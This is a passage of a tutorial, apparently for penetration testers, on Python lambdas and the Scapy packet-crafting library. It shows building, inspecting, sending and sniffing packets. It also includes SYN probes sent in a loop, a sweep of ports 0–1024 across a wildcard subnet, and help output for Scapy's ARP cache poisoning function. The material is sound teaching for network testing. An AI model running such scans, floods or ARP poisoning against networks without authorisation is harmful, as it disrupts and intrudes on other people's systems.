['bbbbbbt', 'cccx', 'az']
</code></pre>
<p>Extracting privileged ports(under 1024) from a list of port numbers using lambda function.</p>
<pre><code>&gt;&gt;&gt; open_ports = [1,20,21,25,80,443,1639,4444,6798]
&gt;&gt;&gt; 
&gt;&gt;&gt; privileged_ports = filter(lambda x: x &lt;1024, open_ports)
&gt;&gt;&gt; privileged_ports
[1, 20, 21, 25, 80, 443]
&gt;&gt;&gt; 
</code></pre>
<p>If you are not comfortable with using lambda functions, you can simply use normal functions.</p>
<pre><code>&gt;&gt;&gt; def extract_priv_ports(port_number):
...     if port_number &lt; 1024:
...         return port_number
&gt;&gt;&gt;
&gt;&gt;&gt; privileged_ports = filter(extract_priv_ports, open_ports)
&gt;&gt;&gt; privileged_ports
[1, 20, 21, 25, 80, 443]
&gt;&gt;&gt; 
</code></pre>
<blockquote>
<p>Lambda funtions are good when they are short and as throw away functions. If you plan on doing anything remotely complex with it, put lambda away and define a real function.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="scapy"><a class="header" href="#scapy">Scapy</a></h1>
<ul>
<li><a href="scapy/scapy_intro.html">Scapy Intro</a></li>
<li><a href="scapy/scapy_modes.html">Scapy Modes</a></li>
<li><a href="scapy/exploring_scapy.html">Exploring Scapy</a></li>
<li><a href="scapy/creating_packets.html">Creating Packets</a></li>
<li><a href="scapy/inspecting_packets.html">Inspecting Packets</a></li>
<li><a href="scapy/send_revieve_packets.html">Send &amp; Recieve Packets</a></li>
<li><a href="scapy/import_export_data.html">Import &amp; Export Data</a></li>
<li><a href="scapy/sniffing.html">Sniffing</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="scapy-intro"><a class="header" href="#scapy-intro">Scapy Intro</a></h1>
<h2 id="trivia"><a class="header" href="#trivia">Trivia</a></h2>
<ul>
<li>Scapy is packet crafting, manipulating and analysis suite</li>
<li>Python interpreter disguised as a Domain Specific Language</li>
<li>Created by Philippe Biondi</li>
</ul>
<h2 id="overview"><a class="header" href="#overview">Overview</a></h2>
<ul>
<li>Helps to forge packets, send &amp; recieve packets, R&amp;W pcaps, alter packets.</li>
<li>Easy &amp; faster packet desgining.</li>
<li>Dozens of in-built functions to automate various network utilities/attacks..</li>
</ul>
<h2 id="whats-different-about-scapy"><a class="header" href="#whats-different-about-scapy">What’s different about Scapy?</a></h2>
<p>You might be wondering that there are dozens of packet crafting tools, network scanners so why should we use Scapy?</p>
<p>Scapy is not just another packet crafting tool, it comes with a lot of new concepts and paradigms.</p>
<p>Scapy is not desgined as a simple but rather a framework upon which you can build other custom tools.</p>
<h3 id="absolute-freedom-over-packets"><a class="header" href="#absolute-freedom-over-packets">Absolute freedom over packets</a></h3>
<p>A lot of packet crafting tools does not have a way to set certain fields in packets (limitations of <code>sock_raw</code>) i.e. the kernel is still in control of certain fields and will calculate those fields on behalf of the tool (checksums, IHL)</p>
<p>Most packet crating tools let’s you fiddle with only limited fields/protocols, it is impossible to stack unrelated protocol headers into a single packet.</p>
<h4 id="try-to-find-a-tool-that-can-do"><a class="header" href="#try-to-find-a-tool-that-can-do">Try to find a tool that can do</a></h4>
<ul>
<li>An ICMP echo request with some given padding data</li>
<li>An IP protocol scan with the More Fragments flag</li>
<li>Some ARP cache poisoning with a VLAN hopping attack</li>
<li>A traceroute with an applicative payload (DNS, ISAKMP, etc.)</li>
</ul>
<p>Scapy tries to overcome those problems. It enables you to build exactly the packets you want. Even if you think stacking a 802.1q layer on top of TCP makes no sense, it may have some for somebody else working on some product. </p>
<p>Scapy has a flexible model that tries to avoid any arbitrary limits. You’re free to put any value you want in any field you want, and stack them like you want. You’re an adult after all.</p>
<h4 id="decode-not-interpret"><a class="header" href="#decode-not-interpret">Decode, Not Interpret</a></h4>
<pre><code>Tool that interprets - “The port 80 is filtered”
Tool that decodes - “I have recieved ICMP type 3; code 13 from port 80”
</code></pre>
<ul>
<li>Having a tool that interprets is convenient but it is not the the best approach all the time.</li>
<li>Tools interpret results based on the tool authors logic but every network is unique, one interpretation does not fit all the senarios.</li>
<li>Interpreting results can help users that don’t know what a port scan is but it can also make more harm than good, as it injects bias into the results. A more knowledgable penetration tester woud want to see all the information and make interpretation himself. Unfortunately many tools discard most information that is needed.</li>
<li>Networks are complex especially with the advent of firewalls, cloud infrastructure etc so each pen test is unique and you have to pay attention to even the minute details rather than relying on some tools interpretation blindly.</li>
</ul>
<h4 id="fast-packet-desgining--power-of-python"><a class="header" href="#fast-packet-desgining--power-of-python">Fast packet desgining &amp; power of Python</a></h4>
<p>Other tools stick to the program-that-you-run-from-a-shell paradigm. The result is an awful syntax to describe a packet. For these tools, the solution adopted uses a higher but less powerful description, in the form of scenarios imagined by the tool’s author. As an example, only the IP address must be given to a port scanner to trigger the port scanning scenario. Even if the scenario is tweaked a bit, you still are stuck to a port scan.</p>
<p>Scapy is not a simple shell command program; Scapy runs inside Python interpreter, provides you the whole language when dealing with packets but you don’t need to master Python to use Scapy though.</p>
<p>Scapy’s paradigm is to propose a Domain Specific Language (DSL) that enables a powerful and fast description of any kind of packet. Using the Python syntax and a Python interpreter as the DSL syntax and interpreter has many advantages: there is no need to write a separate interpreter, users don’t need to learn yet another language and they benefit from a complete, concise and very powerful language.</p>
<h4 id="probe-once-interpret-many-times"><a class="header" href="#probe-once-interpret-many-times">Probe Once, Interpret Many Times.</a></h4>
<p>Network recon/Network mapping is not simply scanning ports, it’s far more complex and involves techniques like TTL analysis, understanding IP based trust relationships in the network etc.</p>
<p>Unlike many tools, which discard all the information which they deem irrelavent, Scapy gives all the information, i.e. all the stimuli sent and all the responses received. Scapy gives the complete raw data, which can be used many times during analysis. You’ll have all the Power of Python to dig through the data and perform analysis.</p>
<h2 id="scapy-limitations"><a class="header" href="#scapy-limitations">Scapy Limitations</a></h2>
<ul>
<li>Scapy is not designed for fast throughput. It’s written in Python which comes with many layers of abstraction.</li>
<li>Scapy does not go easy on memory (Each packet is a class instance). Not a right choice for analysing large packet captures.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="scapy-modes"><a class="header" href="#scapy-modes">Scapy Modes</a></h1>
<h2 id="scapy---interactive-mode"><a class="header" href="#scapy---interactive-mode">Scapy - Interactive mode</a></h2>
<ul>
<li>Just run scapy command in your terminal. You will be presented with an interactive interpreter.</li>
<li>It’s just a Python interpreter disguised as a Domain Specific Language i.e. python interpreter loaded with scapy classes and objects</li>
<li>Scapy in interactive mode suits well for one-liners</li>
</ul>
<pre><code>$ scapy
Welcome to Scapy (2.3.1)
&gt;&gt;&gt; 
&gt;&gt;&gt; 
&gt;&gt;&gt; sniff()
^C&lt;Sniffed: TCP:281 UDP:0 ICMP:0 Other:2&gt;
&gt;&gt;&gt;
</code></pre>
<h2 id="importing-scapy-as-a-module"><a class="header" href="#importing-scapy-as-a-module">Importing Scapy as a module</a></h2>
<p>Scapy can be imported as an externam module into any python scipt.</p>
<pre><code>&gt;&gt;&gt; from scapy.all import *
&gt;&gt;&gt; dir()
['AES', 'AH', 'ARC2', 'ARC4', 'ARP', 'ARPHDR_ETHER', 'ARPHDR_LOOPBACK', 'ARPHDR_METRICOM'   [...snipped...]
&gt;&gt;&gt; IP
&lt;class 'scapy.layers.inet.IP'&gt;
&gt;&gt;&gt; TCP
&lt;class 'scapy.layers.inet.TCP'&gt;
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="exploring-scapy"><a class="header" href="#exploring-scapy">Exploring Scapy</a></h1>
<h2 id="list-of-protocols-supported"><a class="header" href="#list-of-protocols-supported">List of protocols supported</a></h2>
<pre><code>&gt;&gt;&gt; ls()
ARP        : ARP
DNS        : DNS
Dot11      : 802.11
TCP        : TCP
Ether      : Ethernet
[...]
</code></pre>
<h2 id="dissecting-protocols"><a class="header" href="#dissecting-protocols">Dissecting protocols</a></h2>
<pre><code>&gt;&gt;&gt; ls(IP)
version    : BitField             = (4)
ihl        : BitField             = (None)
tos        : XByteField           = (0)
len        : ShortField           = (None)
id         : ShortField           = (1)
flags      : FlagsField           = (0)
frag       : BitField             = (0)
ttl        : ByteField            = (64)
proto      : ByteEnumField        = (0)
chksum     : XShortField          = (None)
src        : Emph                 = (None)
dst        : Emph                 = ('127.0.0.1')
options    : PacketListField      = ([])
</code></pre>
<h2 id="list-of-all-the-scapy-commands"><a class="header" href="#list-of-all-the-scapy-commands">List of all the scapy commands</a></h2>
<pre><code>&gt;&gt;&gt; lsc()
rdpcap     : Read a pcap file and return a packet 
send       : Send packets at layer 3
sendp      : Send packets at layer 2
sendpfast  : Send packets at layer 2 using tcpreplay
[...]
</code></pre>
<h2 id="getting-help-on-any-function"><a class="header" href="#getting-help-on-any-function">Getting help on any function</a></h2>
<pre><code>&gt;&gt;&gt; help(arpcachepoison)

Help on function arpcachepoison in module scapy.layers.l2:

arpcachepoison(target, victim, interval=60)
    Poison target's cache with (your MAC,victim's IP) couple
    arpcachepoison(target, victim, [interval=60]) -&gt; None

[...]
</code></pre>
<h2 id="change-scapy-configuration"><a class="header" href="#change-scapy-configuration">Change Scapy configuration</a></h2>
<pre><code>&gt;&gt;&gt; conf
iface      = 'eth3'
iface6     = 'wlan0'
wepkey     = ''
sniff_promisc = 1
[...]
</code></pre>
<blockquote>
<p>Assembling and sending raw packets requires UID 0 (root access). Use <code>sudo</code> to become root.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="creating-packets"><a class="header" href="#creating-packets">Creating Packets</a></h1>
<h2 id="creating-a-packet"><a class="header" href="#creating-a-packet">Creating a packet</a></h2>
<ul>
<li>Scapy packet creation is consistent with layered approach in networking</li>
<li>The basic building block of a packet is a layer, and a whole packet is built by stack- ing layers on top of one another</li>
<li>In scapy, packets are constructed by defining packet headers for each protocol at different layers of TCP/IP and then stacking these layers in order</li>
<li>To create a DNS query, you need to build Ether(sometimes optional), IP,UDP headers and stack them using / operator</li>
</ul>
<h2 id="creating-packet-in-one-line"><a class="header" href="#creating-packet-in-one-line">Creating packet in one line</a></h2>
<pre><code>&gt;&gt;&gt; packet = Ether()/IP(dst='8.8.8.8')/TCP(dport=53,flags='S')

    A full-fledged DNS request packet

&gt;&gt;&gt; dns_query = IP(dst=&quot;8.8.8.8&quot;)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=&quot;null.co.in&quot;))
&gt;&gt;&gt; 
&gt;&gt;&gt; dns_query
&lt;IP  frag=0 proto=udp dst=8.8.8.8 |&lt;UDP  sport=domain dport=domain |&lt;DNS  rd=1 qd=&lt;DNSQR  qname='null.co.in' |&gt; |&gt;&gt;&gt;
</code></pre>
<h2 id="create-each-layer-individually-and-stack-them-using--operator"><a class="header" href="#create-each-layer-individually-and-stack-them-using--operator">Create each layer individually and stack them using ‘/’ operator</a></h2>
<pre><code>&gt;&gt;&gt; l2 = Ether()
&gt;&gt;&gt; l3 = IP(dst='8.8.8.8/30')
&gt;&gt;&gt; l4 = TCP(dport=53, flags = 'S')
&gt;&gt;&gt; packet = l2/l3/l4
</code></pre>
<h2 id="scapy-ip-notations"><a class="header" href="#scapy-ip-notations">Scapy IP notations</a></h2>
<p>Scapy accepts plain dotted-quad IP notation, CIDR notation, hostnames.</p>
<pre><code>&gt;&gt;&gt; packet = IP(dst = '8.8.8.8')
&gt;&gt;&gt; 
&gt;&gt;&gt; packet = IP(dst = 'scanme.nmap.org')
&gt;&gt;&gt; 
&gt;&gt;&gt; packet = IP(dst = '8.8.8.8/30')
# Above line created 4 packets in one statements implicitly.
# Using list comprehensions to view all the packets.
&gt;&gt;&gt; [a for a in packet]
[&lt;IP  dst=8.8.8.8 |&gt;, &lt;IP  dst=8.8.8.9 |&gt;, &lt;IP  dst=8.8.8.10 |&gt;, &lt;IP  dst=8.8.8.11 |&gt;]

&gt;&gt;&gt; packet = IP(dst = 'egadz.metasploit.com/30')
</code></pre>
<h2 id="creating-set-of-packets"><a class="header" href="#creating-set-of-packets">Creating set of packets</a></h2>
<p>We can create a set of packets implicitly using Scapy.</p>
<pre><code>pkts = IP(ttl=[1,3,5,(7,10)])/TCP()
</code></pre>
<p>For inspecting set of packets you can use list comprehensions</p>
<pre><code>[pkt for pkt in pkts]

&gt;&gt;&gt; [pkt for pkt in pkts]
[&lt;IP  frag=0 ttl=1 proto=tcp |&lt;TCP  |&gt;&gt;, &lt;IP  frag=0 ttl=3 proto=tcp |&lt;TCP  |&gt;&gt;, &lt;IP  frag=0 ttl=5 proto=tcp |&lt;TCP  |&gt;&gt;, &lt;IP  frag=0 ttl=7 proto=tcp |&lt;TCP  |&gt;&gt;, &lt;IP  frag=0 ttl=8 proto=tcp |&lt;TCP  |&gt;&gt;, &lt;IP  frag=0 ttl=9 proto=tcp |&lt;TCP  |&gt;&gt;, &lt;IP  frag=0 ttl=10 proto=tcp |&lt;TCP  |&gt;&gt;]
&gt;&gt;&gt;
&gt;&gt;&gt; from pprint import pprint
&gt;&gt;&gt; pprint([pkt for pkt in pkts])
[&lt;IP  frag=0 ttl=1 proto=tcp |&lt;TCP  |&gt;&gt;,
 &lt;IP  frag=0 ttl=3 proto=tcp |&lt;TCP  |&gt;&gt;,
 &lt;IP  frag=0 ttl=5 proto=tcp |&lt;TCP  |&gt;&gt;,
 &lt;IP  frag=0 ttl=7 proto=tcp |&lt;TCP  |&gt;&gt;,
 &lt;IP  frag=0 ttl=8 proto=tcp |&lt;TCP  |&gt;&gt;,
 &lt;IP  frag=0 ttl=9 proto=tcp |&lt;TCP  |&gt;&gt;,
 &lt;IP  frag=0 ttl=10 proto=tcp |&lt;TCP  |&gt;&gt;]
</code></pre>
<pre><code>&gt;&gt;&gt; IP(dst=&quot;192.168.*.1-10&quot;)/TCP(dport=(0,1024))
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="inspecting-packets"><a class="header" href="#inspecting-packets">Inspecting Packets</a></h1>
<p>Get detailed description of the packet along with datatypes</p>
<pre><code>&gt;&gt;&gt; packet = IP()/TCP()
&gt;&gt;&gt; ls(packet)
version    : BitField             = 4               (4)
ihl        : BitField             = None            (None)
tos        : XByteField           = 0               (0)
len        : ShortField           = None            (None)
id         : ShortField           = 1               (1)
flags      : FlagsField           = 0               (0)
frag       : BitField             = 0               (0)
ttl        : ByteField            = 64              (64)
proto      : ByteEnumField        = 6               (0)
chksum     : XShortField          = None            (None)
src        : Emph                 = '127.0.0.1'     (None)
dst        : Emph                 = '127.0.0.1'     ('127.0.0.1')
options    : PacketListField      = []              ([])
[-- snipped --]
</code></pre>
<h2 id="show"><a class="header" href="#show">show()</a></h2>
<p>Displays detailed headers but does not assemble the packet</p>
<pre><code>&gt;&gt;&gt; packet.show()
###[ IP ]###
  version= 4
  ihl= None
  len= None
  [...]
  proto= hopopt
  chksum= None
  src= 192.168.1.100
  dst= Net('8.8.8.8/30')
</code></pre>
<h2 id="show2"><a class="header" href="#show2">show2</a></h2>
<p>Similar to <code>show()</code> but also assembles the packet and calculates the checksums and IHL.</p>
<pre><code>&gt;&gt;&gt; packet.show2()
###[ IP ]###
  version= 4L
  ihl= 5L
  [...]
  ttl= 64
  proto= hopopt
  chksum= 0xa8cd
  src= 192.168.1.100
  dst= 8.8.8.8
</code></pre>
<h2 id="get-only-user-supplied-values"><a class="header" href="#get-only-user-supplied-values">Get only user supplied values</a></h2>
<pre><code>&gt;&gt;&gt; b.hide_defaults( )
</code></pre>
<h2 id="summary"><a class="header" href="#summary">summary</a></h2>
<p>Display short &amp; interesting summary of a packet.</p>
<pre><code>&gt;&gt;&gt; packet.summary()
'Ether / IP / TCP 192.168.1.100:ftp_data &gt; 8.8.8.8:domain S'
</code></pre>
<h2 id="nsummary"><a class="header" href="#nsummary">nsummary</a></h2>
<p>Display short &amp; interesting summary of a packet with numbering.</p>
<pre><code>&gt;&gt;&gt; pkts[0].nsummary()
0000 IP / TCP 192.168.1.103:ftp_data &gt; 198.58.109.32:tcpmux S ==&gt; IP / TCP 198.58.109.32:tcpmux &gt; 192.168.1.103:ftp_data SA
0001 IP / TCP 192.168.1.103:ftp_data &gt; 198.58.109.32:3128 S ==&gt; IP / TCP 198.58.109.32:3128 &gt; 192.168.1.103:ftp_data SA
0002 IP / TCP 192.168.1.103:ftp_data &gt; 198.58.109.32:http_alt S ==&gt; IP / TCP 198.58.109.32:http_alt &gt; 192.168.1.103:ftp_data SA
</code></pre>
<p><code>summary()</code> and <code>nsummary()</code> supports advanced features such as:</p>
<ul>
<li>Filtering packets by individual header field values using <code>lfilter</code> argument</li>
<li>Printing only necessary parts of packet using <code>prn</code> argument</li>
</ul>
<pre><code>&gt;&gt;&gt; egadz[0].nsummary(lfilter= lambda (s,r): r[TCP].sport == 3128 or r[TCP].sport==1)
0000 IP / TCP 192.168.1.103:ftp_data &gt; 198.58.109.32:tcpmux S ==&gt; IP / TCP 198.58.109.32:tcpmux &gt; 192.168.1.103:ftp_data SA
0001 IP / TCP 192.168.1.103:ftp_data &gt; 198.58.109.32:3128 S ==&gt; IP / TCP 198.58.109.32:3128 &gt; 192.168.1.103:ftp_data SA
</code></pre>
<pre><code>&gt;&gt;&gt; egadz[0].nsummary(lfilter= lambda (s,r): r[TCP].sport == 3128, prn = lambda (s,r): s.dst)
0001 198.58.109.32
</code></pre>
<h2 id="interacting-with-fields-inside-packet"><a class="header" href="#interacting-with-fields-inside-packet">Interacting with fields inside packet</a></h2>
<h3 id="to-access-a-specific-field-packet_namefield"><a class="header" href="#to-access-a-specific-field-packet_namefield">To access a specific field: [packet_name].[field]</a></h3>
<pre><code>&gt;&gt;&gt; packet.dst
'd8:55:a3:fe:80:78'
</code></pre>
<h3 id="for-fields-that-are-not-unique-packet_nameprotofield"><a class="header" href="#for-fields-that-are-not-unique-packet_nameprotofield">For fields that are not unique [packet_name][proto].[field]</a></h3>
<pre><code>&gt;&gt;&gt; packet[Ether].dst
'd8:55:a3:fe:80:78'
&gt;&gt;&gt; packet[IP].dst
'8.8.8.8'
</code></pre>
<h3 id="payload-ignores-the-lowest-layer-and-parses-the-next-layer"><a class="header" href="#payload-ignores-the-lowest-layer-and-parses-the-next-layer"><code>.payload</code> ignores the lowest layer and parses the next layer.</a></h3>
<pre><code>&gt;&gt;&gt; packet.payload.flags
0
&gt;&gt;&gt; packet.payload.payload.flags
2
</code></pre>
<h2 id="checking-for-presence-of-layer-in-packet"><a class="header" href="#checking-for-presence-of-layer-in-packet">Checking for presence of layer in packet</a></h2>
<h3 id="haslayer-method"><a class="header" href="#haslayer-method"><code>haslayer</code> method</a></h3>
<p>checks for presence of a layer in a packet</p>
<pre><code>&gt;&gt;&gt; if packet.haslayer(TCP):
...     print packet[TCP].flags
... 
2
&gt;&gt;&gt;
</code></pre>
<h3 id="using-an-in-construct"><a class="header" href="#using-an-in-construct">Using an <code>in</code> construct</a></h3>
<pre><code>&gt;&gt;&gt; pkt = IP()/TCP()/DNS()
&gt;&gt;&gt;
&gt;&gt;&gt; DNS in pkt
True
</code></pre>
<h2 id="scapys-sprintf"><a class="header" href="#scapys-sprintf">Scapy’s <code>sprintf</code></a></h2>
<ul>
<li><code>sprintf()</code> method is one of the very powerful features of <code>scapy.sprintf</code> comes very handy while writing custom tools</li>
<li><code>sprintf</code> fills a format string with values from the packet, much like it <code>sprintf</code> from C Library, except here it fills the format string with field values from packets.</li>
</ul>
<pre><code>sprintf format     -    % [ [ fmt ] [ r ] , ] [ layer [ :nb ] . ] field %
</code></pre>
<pre><code>Example     -    %-5sr, TCP.flags%
</code></pre>
<pre><code>&gt;&gt;&gt; packet.sprintf(&quot;Ethernet source is %Ether.src% and IP proto is %IP.proto%&quot;)
'Ethernet source is 00:00:00:00:00:00 and IP proto is icmp'

&gt;&gt;&gt; a=Ether( )/Dot1Q(vlan=42)/IP(dst=&quot;192.168.0.1&quot;)/TCP(flags=&quot;RA&quot;)
&gt;&gt;&gt;
&gt;&gt;&gt; a.sprintf(&quot;%dst% %IP.dst% vlan=%Dot1Q.vlan%&quot;)
'00:00:d4:ae:3f:71 192.168.0.1 vlan=42'
&gt;&gt;&gt;
&gt;&gt;&gt;a.sprintf(&quot; %TCP.flags% | %5s,TCP.flags% | %#05xr,TCP.flags%&quot;)
' RA | RA    | 0x014'

</code></pre>
<pre><code>&gt;&gt;&gt; res.nsummary(lfilter = lambda (s,r): r[TCP].flags &amp; 2)
0008 IP / TCP 192.168.5.20:ftp-data &gt; 192.168.5.22:discard S ==&gt;
IP / TCP 192.168.5.22:discard &gt; 192.168.5.20:ftp-data SA / Padding
</code></pre>
<pre><code>&gt;&gt;&gt; res.nsummary(lfilter = lambda (s,r): r[TCP].flags &amp; 2, prn = lambda (s,r):s.dport)
0008 9
0012 13
0021 22
0024 25
</code></pre>
<h2 id="packet-handlers"><a class="header" href="#packet-handlers">Packet handlers</a></h2>
<p>In the below example, we used lambda function to write a packet handler that can handle TCP packets but this function does not work with anything other than TCP packets.</p>
<pre><code>&gt;&gt;&gt; f=lambda x:x.sprintf(&quot;%IP.dst%:%TCP.dport%&quot;)
&gt;&gt;&gt; f(IP(dst='8.8.8.8')/TCP())
'8.8.8.8:www'
&gt;&gt;&gt; f(IP('8.8.8.8')/UDP())
'8.8.8.8:??'
</code></pre>
<p>Having a function that can work with various packets can be helpful in practical senarios, we can achieve this using conditional substrings in sprintf(). A conditional substring is only triggered when a layer is present in the packet or else it is ignored. You can also use ! for checking the absence of a layer.</p>
<pre><code>Conditional substring format     -    { [ ! ] layer : substring }
</code></pre>
<pre><code>&gt;&gt;&gt; f=lambda x: x.sprintf(&quot;=&gt; {IP:ip=%IP.dst% {UDP:dport=%UDP.dport%}\
... {TCP:%TCP.dport%/%TCP.flags%}{ICMP:type=%r,ICMP.type%}}\
... {!IP:not an IP packet}&quot;)
&gt;&gt;&gt; 
&gt;&gt;&gt; f(IP()/TCP())
'=&gt; ip=127.0.0.1 http/S'
&gt;&gt;&gt; 
&gt;&gt;&gt; f(IP()/UDP())
'=&gt; ip=127.0.0.1 dport=domain'
&gt;&gt;&gt; 
&gt;&gt;&gt; f(IP()/ICMP())
'=&gt; ip=127.0.0.1 type=8'
&gt;&gt;&gt;
&gt;&gt;&gt; f(Ether()/ARP())
'=&gt; not an IP packet'
</code></pre>
<h2 id="pythons-format-method"><a class="header" href="#pythons-format-method">Python’s format method</a></h2>
<ul>
<li>Python string format method generates beautiful output but unlike sprintf it prints literal values.</li>
</ul>
<pre><code>&gt;&gt;&gt; &quot;Ether source is: {} &amp; IP proto is: {}&quot;.format(packet.src, packet.proto)
'Ether source is: 00:00:00:00:00:00 &amp; IP proto is: 1'
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="send--recieve-packets"><a class="header" href="#send--recieve-packets">Send &amp; Recieve Packets</a></h1>
<ul>
<li>Send &amp; recieve funtions are the heart of scapy’s functionality</li>
</ul>
<blockquote>
<p>Most scapy funtions like <code>send()</code>, <code>sniff()</code> functions has fine grain options like applying bpf filters, timeout, retry, verbosity etc. Use <code>help(function_name)</code> to find out more options.</p>
</blockquote>
<h2 id="send"><a class="header" href="#send">send()</a></h2>
<ul>
<li>Send packets at Layer 3(Scapy creates Layer 2 header), Does not recieve any packets.</li>
<li><code>loop</code> argument is by default 0, if it’s value is anything other than 0 then the packets will be sent in a loop till CTRL-C is pressed</li>
<li><code>count</code> can be used to set exact number of packets to be sent.</li>
<li><code>inter</code> can be used to set numbers of seconds between each packet.</li>
</ul>
<pre><code>&gt;&gt;&gt; send(IP(dst='8.8.8.8')/TCP(dport=53, flags='S'))
.
Sent 1 packets.
&gt;&gt;&gt; 
&gt;&gt;&gt; send(IP(dst=['8.8.8.8', '8.8.8.4'])/TCP(dport=53, flags='S'))
..
Sent 2 packets.
&gt;&gt;&gt;
&gt;&gt;&gt; send(IP(dst='8.8.8.8')/TCP(dport=53, flags='S'), count=10)
..........
Sent 10 packets.
&gt;&gt;&gt;
&gt;&gt;&gt; send(IP(dst='8.8.8.8')/TCP(dport=53, flags='S'), loop=1)
......................... [... snipped ...]
Sent 1503 packets.
</code></pre>
<h2 id="sendp"><a class="header" href="#sendp">sendp()</a></h2>
<ul>
<li>Same as <code>send()</code> but sends packets at Layer 2 (Must provide Layer 2 header), does not recieve any packets</li>
<li>Use <code>iface</code> to set interface to send packets on. (If not set <code>conf.iface</code> value will be used)</li>
</ul>
<pre><code>&gt;&gt;&gt; sendp(Ether()/IP(dst=&quot;1.2.3.4&quot;,ttl=(1,4)), iface=&quot;eth1&quot;)
....
Sent 4 packets.

&gt;&gt;&gt; sendp(&quot;I’m travelling on Ethernet&quot;, iface=&quot;eth1&quot;, loop=1, inter=0.2)

&gt;&gt;&gt; sendp(rdpcap(&quot;/tmp/pcapfile&quot;)) # tcpreplay
...........
Sent 11 packets.
</code></pre>
<h2 id="sr"><a class="header" href="#sr">sr()</a></h2>
<ul>
<li>Sends packets and receiving answers.</li>
<li><code>sr()</code> returns a two lists, first list contains stimulus-response couple(like a tuple), and the second list contains the unanswered probes</li>
</ul>
<pre><code>&gt;&gt;&gt; sr(IP(dst=&quot;192.168.8.1&quot;)/TCP(dport=[21,22,23]))

Received 6 packets, got 3 answers, remaining 0 packets
(&lt;Results: UDP:0 TCP:3 ICMP:0 Other:0&gt;, &lt;Unanswered: UDP:0

&gt;&gt;&gt; ans,unans=_
&gt;&gt;&gt; ans.summary()
</code></pre>
<p><img src="scapy/../imgs/onevar.png" alt="sr_onevar" /></p>
<p><img src="scapy/../imgs/twovar.png" alt="sr_twovar" /></p>
<h2 id="sr1"><a class="header" href="#sr1">sr1()</a></h2>
<p>Sends all the stimulus and records only the first response.</p>
<pre><code>&gt;&gt;&gt; p=sr1(IP(dst=&quot;scanme.nmap.org&quot;)/ICMP()/&quot;XXXXXXXXXXX&quot;)
Begin emission:
...Finished to send 1 packets.
.*
Received 5 packets, got 1 answers, remaining 0 packets
</code></pre>
<h2 id="srloop"><a class="header" href="#srloop">srloop()</a></h2>
<ul>
<li>Sends stimulus, recieves responses and displays responses, in a loop.</li>
<li>The function returns a couple of packet and answers, and the unanswered.</li>
</ul>
<pre><code>&gt;&gt;&gt; packet = IP(dst='192.168.56.102')/ICMP()
&gt;&gt;&gt; srloop(packet)
RECV 1: IP / ICMP 192.168.56.102 &gt; 192.168.56.1 echo-reply 0
RECV 1: IP / ICMP 192.168.56.102 &gt; 192.168.56.1 echo-reply 0
RECV 1: IP / ICMP 192.168.56.102 &gt; 192.168.56.1 echo-reply 0
^C        
Sent 3 packets, received 3 packets. 100.0% hits.
(&lt;Results: TCP:0 UDP:0 ICMP:3 Other:0&gt;, &lt;PacketList: TCP:0 UDP:0 ICMP:0 Other:0&gt;)
</code></pre>
<blockquote>
<p>The loopback interface is a very special. Packets going through it are not really assembled and dissassembled</p>
<p>The kernel routes the packet to its destination while it is still stored an internal structure. The kernel is not aware of what Scapy is doing behind his back, so what you see on the lo interface is also a fake. Except this one did not come from a local structure. Thus the kernel will never receive it.</p>
<p>To speak to local applications, you need to build your packets one layer upper, using a PF_INET/SOCK_RAW socket &gt; instead of a PF_PACKET/SOCK_RAW (or its equivalent on other systems that Linux).</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="import--export-data"><a class="header" href="#import--export-data">Import &amp; Export Data</a></h1>
<h2 id="pcap-format"><a class="header" href="#pcap-format">PCAP format</a></h2>
<p>Import packets from PCAP file.</p>
<pre><code>&gt;&gt;&gt; pkts = rdpcap(&quot;temp.cap&quot;)
</code></pre>
<pre><code>&gt;&gt;&gt; pkts = sniff(offline=&quot;temp.cap&quot;)
</code></pre>
<ul>
<li>Export packets to pcap file.</li>
</ul>
<pre><code>&gt;&gt;&gt; wrpcap(&quot;temp.cap&quot;,pkts)
</code></pre>
<h2 id="hexdump-format"><a class="header" href="#hexdump-format">hexdump format</a></h2>
<ul>
<li>Scapy allows you to export recorded packets in various hex formats</li>
<li>Use <code>hexdump()</code> function to display one or more packets using classic hexdump format</li>
</ul>
<pre><code>&gt;&gt;&gt; hexdump(pkt)
0000   00 50 56 FC CE 50 00 0C  29 2B 53 19 08 00 45 00   .PV..P..)+S...E.
0010   00 54 00 00 40 00 40 01  5A 7C C0 A8 19 82 04 02   .T..@.@.Z|......
0020   02 01 08 00 9C 90 5A 61  00 01 E6 DA 70 49 B6 E5   ......Za....pI..
0030   08 00 08 09 0A 0B 0C 0D  0E 0F 10 11 12 13 14 15   ................
0040   16 17 18 19 1A 1B 1C 1D  1E 1F 20 21 22 23 24 25   .......... !&quot;#$%
0050   26 27 28 29 2A 2B 2C 2D  2E 2F 30 31 32 33 34 35   &amp;'()*+,-./012345
0060   36 37                                              67
</code></pre>
<ul>
<li>Hexdump above can be reimported back into Scapy using import_hexcap() function:</li>
</ul>
<pre><code>&gt;&gt;&gt; pkt_hex = Ether(import_hexcap())
0000   00 50 56 FC CE 50 00 0C  29 2B 53 19 08 00 45 00   .PV..P..)+S...E.
0010   00 54 00 00 40 00 40 01  5A 7C C0 A8 19 82 04 02   .T..@.@.Z|......
0020   02 01 08 00 9C 90 5A 61  00 01 E6 DA 70 49 B6 E5   ......Za....pI..
0030   08 00 08 09 0A 0B 0C 0D  0E 0F 10 11 12 13 14 15   ................
0040   16 17 18 19 1A 1B 1C 1D  1E 1F 20 21 22 23 24 25   .......... !&quot;#$%
0050   26 27 28 29 2A 2B 2C 2D  2E 2F 30 31 32 33 34 35   &amp;'()*+,-./012345
0060   36 37                                              67
&gt;&gt;&gt; pkt_hex
&lt;Ether  dst=00:50:56:fc:ce:50 src=00:0c:29:2b:53:19 type=0x800 |&lt;IP  version=4L 
ihl=5L tos=0x0 len=84 id=0 flags=DF frag=0L ttl=64 proto=icmp chksum=0x5a7c 
src=192.168.25.130 dst=4.2.2.1 options='' |&lt;ICMP  type=echo-request code=0 
